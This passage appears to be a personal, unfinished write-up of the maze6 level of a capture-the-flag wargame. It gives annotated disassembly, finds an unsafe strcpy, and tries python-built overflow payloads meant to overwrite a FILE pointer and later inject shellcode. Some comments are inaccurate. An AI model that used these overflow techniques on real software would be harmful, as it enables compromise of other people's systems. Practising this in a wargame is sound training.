   ```assembly
   0x0804855b <+0>:     push   ebp
   0x0804855c <+1>:     mov    ebp,esp
   0x0804855e <+3>:     sub    esp,0x104
   0x08048564 <+9>:     cmp    DWORD PTR [ebp+0x8],0x3		#env = 3 paras
   0x08048568 <+13>:    je     0x8048584 <main+41>
   0x0804856a <+15>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804856d <+18>:    mov    eax,DWORD PTR [eax]
   0x0804856f <+20>:    push   eax
   0x08048570 <+21>:    push   0x80486a0
   0x08048575 <+26>:    call   0x80483c0 <printf@plt>
   0x0804857a <+31>:    add    esp,0x8
   0x0804857d <+34>:    push   0xffffffff
   0x0804857f <+36>:    call   0x80483f0 <exit@plt>
   0x08048584 <+41>:    mov    eax,DWORD PTR [ebp+0xc]		
   0x08048587 <+44>:    add    eax,0x4
   0x0804858a <+47>:    mov    eax,DWORD PTR [eax]		#eax = env[0] = filenmae
   0x0804858c <+49>:    push   0x80486b7			#"a"
   0x08048591 <+54>:    push   eax
   0x08048592 <+55>:    call   0x8048430 <fopen@plt>		#file open
   0x08048597 <+60>:    add    esp,0x8
   0x0804859a <+63>:    mov    DWORD PTR [ebp-0x4],eax
   0x0804859d <+66>:    cmp    DWORD PTR [ebp-0x4],0x0
   0x080485a1 <+70>:    jne    0x80485b7 <main+92>		#if fopen returned null ptr
   0x080485a3 <+72>:    push   0x80486b9
   0x080485a8 <+77>:    call   0x80483d0 <perror@plt>
   0x080485ad <+82>:    add    esp,0x4
   0x080485b0 <+85>:    push   0xffffffff
   0x080485b2 <+87>:    call   0x80483f0 <exit@plt>
   0x080485b7 <+92>:    mov    eax,DWORD PTR [ebp+0xc]		#continue here
   0x080485ba <+95>:    add    eax,0x8
   0x080485bd <+98>:    mov    eax,DWORD PTR [eax]
   0x080485bf <+100>:   push   eax				#eax = env[1] = wb
   0x080485c0 <+101>:   lea    eax,[ebp-0x104]			#buffer of size 160
   0x080485c6 <+107>:   push   eax
   0x080485c7 <+108>:   call   0x80483e0 <strcpy@plt>		#strcpy it
   0x080485cc <+113>:   add    esp,0x8
   0x080485cf <+116>:   lea    eax,[ebp-0x104]
   0x080485d5 <+122>:   push   eax
   0x080485d6 <+123>:   call   0x8048400 <strlen@plt>		#strlen(buffer)
   0x080485db <+128>:   add    esp,0x4
   0x080485de <+131>:   push   eax
   0x080485df <+132>:   lea    eax,[ebp-0x104]
   0x080485e5 <+138>:   push   eax				
   0x080485e6 <+139>:   call   0x8048440 <memfrob@plt>		#memfrob(buffer, len)
   0x080485eb <+144>:   add    esp,0x8				#encrypts buffer with xor(42)
   0x080485ee <+147>:   mov    eax,DWORD PTR [ebp+0xc]		
   0x080485f1 <+150>:   add    eax,0x4
   0x080485f4 <+153>:   mov    eax,DWORD PTR [eax]		#eax = env[0]
   0x080485f6 <+155>:   lea    edx,[ebp-0x104]
   0x080485fc <+161>:   push   edx				#edx = buffer
   0x080485fd <+162>:   push   eax
   0x080485fe <+163>:   push   0x80486bf			#
   0x08048603 <+168>:   push   DWORD PTR [ebp-0x4]		#file ptr
   0x08048606 <+171>:   call   0x8048420 <fprintf@plt>
   0x0804860b <+176>:   add    esp,0x10
   0x0804860e <+179>:   push   0x0
   0x08048610 <+181>:   call   0x80483f0 <exit@plt>
```

at main+108, we see unsafe strcpy, so we can use this to our advantage...

/maze/maze6 /tmp/mz6/temp $(python -c 'print "A"*300')
indeed gives seg. fault...

after some trial and error, we see that $(python -c 'print "A"*256+"BBBB"')
over writes file ptr with xor('BBBB', 2a)
lets try to write to our program (inside vfprint): 
0x0804855c --> 0x222eaf76
r /tmp/mz6/temp $(python -c 'print "\x6b"*256+"\x76\xaf\x2e\x22"')
that didnt work...


info reg:
eax            0x41414145       1094795589		#overwritten
ecx            0xffffd5be       -10818			#near ebp
edx            0xffffd5be       -10818			#near ebp
ebx            0x0      0
esp            0xffffd4a4       0xffffd4a4
ebp            0xffffd5a8       0xffffd5a8		#still ebp
esi            0x3      3
edi            0xf7fc5000       -134459392		#return address
eip            0x80485f4        0x80485f4 <main+153>
eflags         0x10202  [ IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99

source for exploit:
https://translate.googleusercontent.com/translate_c?depth=1&hl=iw&rurl=translate.google.com&sl=zh-CN&sp=nmt4&tl=en&u=http://www.ouah.org/fsp-overflows.txt&xid=17259,15700023,15700186,15700190,15700256,15700259,15700262,15700265,15700271,15700283&usg=ALkJrhh3FhEPYOVx2j7xMX-iZsIs6vnMSQ

we want to override the FILE struct, and use it to write shell code...
[in progress]


